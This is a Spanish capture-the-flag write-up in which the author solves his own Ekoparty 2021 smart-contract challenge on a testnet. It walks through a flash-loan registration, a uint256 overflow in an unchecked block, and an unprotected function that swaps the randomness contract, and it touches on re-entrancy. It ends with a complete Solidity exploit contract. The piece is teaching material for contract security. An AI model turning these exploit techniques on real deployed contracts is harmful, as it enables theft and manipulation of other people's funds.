# Turing Challenge for Ekoparty 2021

En este caso voy a resolver un desafío que yo mismo hice. La idea de este desafío introducir a la gente a los temas de seguridad en Smart Contracts, teniendo la posibilidad de poder ganar entradas para la Ekoparty 2021 en caso de ganar.

## Enunciado

En este caso el enunciado era simplemente el siguiente:

`rinkeby: 0x71844A843FDAB4759f420Ee9F1faD07Cd4D69Bd8`

## Desafíos

El primer desafío entonces es reconocer que se trata de un desafío de Smart Contracts. Yendo a la dirección del desafío, podemos encontrar el código del mismo, que contiene varios sub-contratos.

En este caso, el contrato hacía uso del contrato ERC20 provisto por OpenZeppelin, por lo que si bien ocupa una gran parte del código, es bueno revisarlo manualmente o con alguna herramienta para ver que efectivamente es el estándar y no una falsificación. Por el contexto de los demás sub-contratos, podemos intuir que no es el caso y podemos **ignorar completamente el contrato ERC20.**

Vamos a enumerar los contratos que tenemos:

|Contrato|Función|
|--------|-------|
|TuringCoin|Token ERC20|
|TuringLoan|Implementación de FlashLoan|
|TuringGambleChance|Función de condición aleatoria|
|TuringChallenge| Lógica del Challenge|
|TuringCTF| Wrapper del Challenge|

De esta forma podemos ver que tenemos dos contratos "Constructores" y los demás son utilitarios de los mismos. Por lo que podemos concentrarnos en orden de uso.

Veamos qué hacen los contratos uno por uno.

### Turing CTF

Este contrato simplemente se encarga de deployar los demás contratos. La parte más importante está en el constructor:

```
constructor() {
    tngc = new TuringCoin(1_000_000);
    flashLoan = new TuringLoan(address(tngc));
    tngc.transfer(address(flashLoan), 500_000 * DECIMALS);
    gamble = new TuringGambleChance();
    challenge = new TuringChallenge(address(tngc), address(gamble));
}
```

Podemos ver que se crean 1 millón de TuringCoins y luego mitad del monto total va hacia la dirección del flashLoan, esto nos indica la cantidad máxima de tokens que puede usar dicho contrato.

Otras funciones útiles dentro de este contrato son las funciones de lectura que devuelven las direcciones de los demás contratos, para que luego podamos interactuar con ellos.

### TuringLoan

Este contrato realiza una simple implementación de un Flash Loan de Turing Coins.

Los Flash Loans son préstamos que tienen una condición esencial. **En la misma transacción que se presta la plata, se tiene que devolver**. Veamos cómo funciona la implementación:

```
function flashLoan(uint256 amount) external {
        uint256 balanceBefore = tngc.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough TuringCoins balance");
        tngc.transfer(msg.sender, amount);
        (bool success,) = msg.sender.call(
            abi.encodeWithSignature("receiveFlashLoan(uint256)", amount)
        );
        require(success, "External call failed");
        require(tngc.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
}
```

Acá podemos ver cómo funciona en detalle. Podemos ver que cuando nosotros llamamos a la función que nos da el préstamo, la misma función hace un llamado hacia nosotros hacia una función que se llama `recieveFlashLoan` con un parámetro de tipo uint256. Esta es una función de callback que tenemos que tener definida previamente.

Como hace falta que se defina la función de callback, esto nos indica que **debemos realizar el llamado a la función desde un smart contract.** Por lo que debemos crear y deployar un contrato en donde llamemos al préstamo y en nuestra implementación del callback se devuelva todo el monto prestado hacia el contrato prestamista. Se puede mencionar que **en caso de que no se devuelva la plata prestada, se anula toda la transacción y todo lo que ocurrió en el medio**.

Un simple contrato que podía utilizar esto podría tener la siguiente forma:

```
function borrow_100() external{
    //pedimos prestado 100
    Loaner_address.flashLoan(100);
}

function recieveFlashLoan(uint256 amount){
    //devolvemos la plata
    TuringCoins.send(Loaner_address, amount);
}
```

Ahora conocemos cómo funciona el contrato y cómo podemos interactuar con él. Luego veremos cómo tenemos que utilizarlo.

### TuringChallenge

Este es el contrato principal del desafío, así que vamos a dedicarnos a entenderlo, ver cómo funciona y qué debemos hacer para completar el desafío.

Lo principal es notar que las funciones hacen referencia a tener chances, usar chances y apostarlas. Sin conocer mucho el lenguaje, podemos interpretar que necesitamos registrarnos en el desafío, obtener una chance y luego apostar para tener otra o usarla para ver si ganamos el challenge. Fácil no? No del todo..

## Registrarse al Challenge

Al notar que existe una función llamada `register`, indica que primero debemos registrarnos en el desafío (dentro del contrato). Sin embargo, existe una condición para registrarse. Como podemos ver:

`require(tngc.balanceOf(msg.sender) >= 250_000 * DECIMALS, "Lo siento. No tenes suficientes Turing Coins");`

Por lo que el primer desafío es obtener Turing Coins! Pero cómo podemos hacer esto si no se venden ni entregan en ningún lado? Quién podría prestarnos algunos para poder registrarnos al desafío? El Flash Loan.

Para registrarnos, podemos crear un contrato que pida un préstamo de 250\_000 tokens, se registre al desafío y devuelva la plata. Similarmente a lo que hicimos antes, podríamos tener algo del estilo:

```
function register_to_challenge() external{
    //pedimos prestado 250.000 Turing Coins
    Loaner_address.flashLoan(250_000);
}

function recieveFlashLoan(uint256 amount){
    TuringChallenge_address.register("my_username");
    //devolvemos la plata
    TuringCoins.send(Loaner_address, amount);
}
```

y listo! Ya nos registramos al challenge.

## Obtener una chance para ganar

Ahora que ya estamos registrados nuestro próximo objetivo es obtener una "chance" dentro del contrato para poder usar y ganar el desafío.

Tenemos dos funciones que hacen referencia a poder dar una chance, `get_chance` y `gamble_chance`. Aunque esta última tiene una restricción:

`require(balanceOf[msg.sender] > 0, "No tienes chances para apostar");`

Esto nos indica que esta última función sirve para aumentar nuestras chances para usar.

Por lo que ahora ya sabemos que:

1. Obtenemos una chance con `get_chance`
2. Podemos apostar esa chance para poder tener más
3. Podemos usar las chances en la función `use_chances`

Arranquemos con el primer item.

La función `get_chance` recibe 2 parámetros y su implementación es la siguiente:

```
function get_chance(uint256 n, string memory secret) external returns (bool) {
        require(already_registered[msg.sender], "Usuario no registrado");
        require(balanceOf[msg.sender] == 0, "Ya tenes una chance");
        require(n > 0, "Solamente numeros positivos");
        require(keccak256(abi.encodePacked(secret)) != keccak256(bytes("TuringCTF")), "Secreto incorrecto");
        bool status = false;
        //unchecked block, what could go wrong?
        unchecked{
            if( (n +1) < 1){
                balanceOf[msg.sender]++;
                status = true;
            }
        }
        return status;
}
```

Las primeras condiciones son para chequear que estamos registrados y que tenemos una chance. La próxima condición nos pide pide que el parámetro n que le demos sea mayor a cero y que el segundo parámetro de texto sea igual al sha256 de "TuringCTF". Estas dos condiciones son fáciles de cumplir.

Luego vamos a la próxima condición. En ella podemos ver un bloque de código "unchecked". Investigando en internet podemos ver que estos bloques de código no realizan chequeos aritméticos.

Vemos entonces que la última condición a cumplir es que **el número que ingresamos antes más 1** sea menor a 1. En principio esta condición es imposible de cumplir numéricamente ya que anteriormente pusimos un número mayor a cero y ahora necesitamos que **si se le suma un número, sea menor a cero**. Sin embargo, tenemos que entender con qué tipos de datos estamos trabajando.

El tipo de dato ingresado es de tipo uint256, osea un entero sin signo, el cual tiene un límite de 2^256 - 1. Qué pasa si le sumamos uno al número máximo? Se genera un overflow, que significa que el valor "se reinicia" a cero. Por lo tanto, el número que debemos proveer es el número máximo de uint256.

La llamada que puede generar una chance es la siguiente:

```
challenge.get_chance(115792089237316195423570985008687907853269984665640564039457584007913129639935, "46174a072891a58cc820e7071d0fc7c8c1881ce0215e21c15c794a555894efcb");
```

Un dato a tener en cuenta es que debido a que para interactuar con el contrato se realiza una transacción pública en la blockchain, alguien podría aprovecharse de esto **para esperar a que alguien más pueda encontrar los parámetros adecuados y luego simplemente copiarlos y enviar una nueva transacción**.

## Obtener más chances

Ahora que ya tenemos una chance para participar, podemos usarla? No

Esto se debe al requisito puesto en `use_chances` que indica que necesitamos al menos 5 chances:

`require(balanceOf[msg.sender] >= 5, "No tenes suficientes chances");`

Entonces tenemos que obtener si o si más chances. La única forma de hacerlo es utilizando la función `gamble_chance`.

Miremos más a fondo la función en cuestión:

```
function gamble_chance() external returns (bool) {
    require(already_registered[msg.sender], "Usuario no registrado");
    require(balanceOf[msg.sender] > 0, "No tienes chances para apostar");
    balanceOf[msg.sender]++;
    bool success = gambleChallenge.gamble();
    if(!success){
        balanceOf[msg.sender]--;
    }
    return success;
}
```

Podemos ver que lo que ocurre es que gastamos una chance y dependiendo del resultado de la función gamble, ganamos otra entrada o perdemos la que teníamos. Sin embargo, la función `gamble()` no está definida en este contrato sino que `gambleChallenge` hace referencia a que es otro contrato.

Entonces ocurre lo siguiente:

1. Gastamos nuestra chance
2. Se llama la función gamble de otro contrato
3. Dependiendo del resultado de esta función, podemos obtener una chance o no

Acá es donde entra en juego el contrato que anteriormente habíamos encontrado: `TuringGambleChance` que tiene una única función:

```
function gamble() external view returns (bool){
    return block.number % 17 == 2;
}
```

Si bien uno puede obtener el número actual del bloque, no podemos saber cuando se va a ejecutar dicha función. Por lo que podemos interpretar que esto es una función aleatoria decente. Podemos calcular las probabilidades de ganar y apostar, si perdemos, tenemos que volver a obtener una chance para ganar y volverla a apostar. O podemos ir por otro camino..

Se ve que en el contrato del Challenge dejaron una función llamada `change_gamble_function` . Mirando el nombre podemos interpretar que **esta función se encarga de cambiar al contrato que implementa la función anterior**. Supongamos que queremos utilizar una función que sea más fácil o más difícil, podemos cambiarla solamente cambiando la referencia.

Entonces **existe una función para poder cambiar la función que nos puede dar una chance más**. Si se pudiera cambiar la función por una nuestra, podríamos definir una función que haga `return true;` y siempre que apostemos la chance, vamos a obtener otra. Veamos cómo podemos hacerlo.

Si miramos los comentarios por encima de la función `change_gamble_function` podemos ver que hay un TODO de agregar el modificador OnlyOwner. Qué es esto?

OnlyOwner fue definido previamente, es un modificador que chequea que la persona que realiza la transacción sea el dueño del contrato. Sin embargo en este caso **se olvidaron de poner el modificador, por lo que no se realiza este chequeo!**

Por lo tanto podemos crear el ataque que teníamos en mente definiendo el siguiente contrato:

```
contract AlwaysTrueGamble {
    function gamble() external view returns (bool){
        return true;
    }
}
```

Debemos respetar el nombre de la función ya que el contrato TuringChallenge va a llamar a una función "gamble" dentro de algún contrato.

De esta forma solo tenemos que deployar el contrato malicioso y luego llamar a la función `change_gamble_function` con la dirección del contrato que deployamos.

Finalmente, podemos llamar a la función `gamble_chance` 5 veces para poder obtener nuestras 5 chances.

Cabe mencionar que existe una forma de conseguir también 5 chances en una sola transacción, esto es con el **ataque de re-entrancy**. Uno podría definir una función de `gamble` que en su interior llame a la función `gamble_chance`, creando una especie de recursividad. Jugando con esto uno podría tener el mismo efecto de tener más chances pero en una sola transacción (sin contar las llamadas "recursivas"). Esto fue intencionalmente posible **debido al orden en el que se efectúan las cosas dentro de `gamble_chance`**.

1. Sumar una chance
2. Evaluar
3. Restar chance en caso de error

Este orden de prioridades es vulnerable por lo comentado anteriormente. El creador del contrato no puede suponer que en el paso 2 no se vuelva al 1.

## Usar las chances

Finalmente, podemos usar nuestras 5 chances.

Para esto solamente tenemos que llamar a la función y dentro de ahí tenemos un poco más de 50% de chances de ganar.

En caso de que no ganemos, tenemos que repetir los pasos anteriores para obtener 5 chances y volver a probar suerte.


# Exploit final

Veamos cómo podemos juntar todas las piezas distintas en un mismo contrato para poder ganar el challenge.

```
//Exploit.sol

pragma solidity ^0.8.0;

interface TuringCoin{
    function transfer(address dst, uint qty) external returns (bool);
    function transferFrom(address src, address dst, uint qty) external returns (bool);
    function approve(address dst, uint qty) external returns (bool);
    function balanceOf(address who) external view returns (uint);
}

interface TuringCTF{
    function turingCoin_address() external returns (address);
    function turingLoan_address() external returns (address);
    function turingChallenge_address() external returns (address);
}

interface TuringLoan{
    function flashLoan(uint256 amount) external;
}

interface TuringChallenge{
    function register(string memory _username) external;
    function get_chance(uint256 n, string memory secret) external returns (bool);
    function change_gamble_function(address _gambleChallenge) external;
    function gamble_chance() external;
    function use_chances() external returns (bool);
    function is_winner(address _addr) external view returns (bool);
}


contract Exploit{

    TuringCTF public ctf;
    TuringCoin tngc;
    TuringLoan loaner;
    TuringChallenge chall;
    uint256 constant DECIMALS = 1;

    constructor(address _ctf) {
        ctf = TuringCTF(_ctf);
        tngc = TuringCoin(ctf.turingCoin_address());
        loaner = TuringLoan(ctf.turingLoan_address());
        chall = TuringChallenge(ctf.turingChallenge_address());

    }

    function setup(address _gambl_addr) external {
        loaner.flashLoan(250_000);
        get_chance();
        change_gam_fun(_gambl_addr);
        for(uint i = 0; i < 5; i++){
            chall.gamble_chance();
        }
    }

    function try_win() external{
        chall.use_chances();
        require(chall.is_winner(address(this)), "not won");
    }

    function receiveFlashLoan(uint256 amount) external returns (bool) {
        //register
        chall.register("lautaro");
        //pay back flash loan
        return tngc.transfer(address(loaner), amount);
    }

    function get_chance() private{
        chall.get_chance(115792089237316195423570985008687907853269984665640564039457584007913129639935,
        "46174a072891a58cc820e7071d0fc7c8c1881ce0215e21c15c794a555894efcb");
    }

    function gamble_chance() external returns (bool){
        chall.gamble_chance();
    }

    function change_gam_fun(address _addr) public{
        chall.change_gamble_function(_addr);
    }

}

contract MyGambleFun {
    function gamble() external view returns (bool){
        return true;
    }
}
```

Primero tenemos que definir todas las interfaces con las que vamos a trabajar, para que el contrato Exploit sepa que esas funciones pertenecen a otros contratos (esto fue omitido en las secciones anteriores).

Podemos ver también que se definió un constructor dentro del contrato para poner todas las direcciones de los contratos que vamos a utilizar, esto lo podemos obtener utilizando las funciones del contrato `TuringCTF`.

Luego, se realiza un Setup en donde se registra al usuario utilizando el Flash Loan, se obtiene una chance y se cambia la función de gamble por la nuestra.

Finalmente, tenemos la función `try_win` que simplemente obtiene 5 chances más y las usa para intentar ganar. Existe un detalle dentro de la función que es el

`require(chall.is_winner(address(this)), "not won");`

Esto hace que **si no hemos ganado, se revierta todo lo previo hecho por la función**. Si bien vamos a tener que pagar el gas igual, lo utilizamos para no perder las chances usadas, ya que **se revierte el llamado a función `use_chances`**.

Eso fue todo! Fue un challenge que requirió de varios pasos y poder escribir y deployar algunos Smart Contracts para completar. Hubiera estado bueno ver cómo se pisaban entre los participantes las distintas funciones de gamble.

Siendo el creador del challenge, puedo describir que el desafío estaba pensado para gente que quiera aprender sobre seguridad en Smart Contracts, tiene parte de investigación, explotación de vulnerabilidades conocidas, escritura de los exploits, un poco de todo.

Espero que les haya gustado!
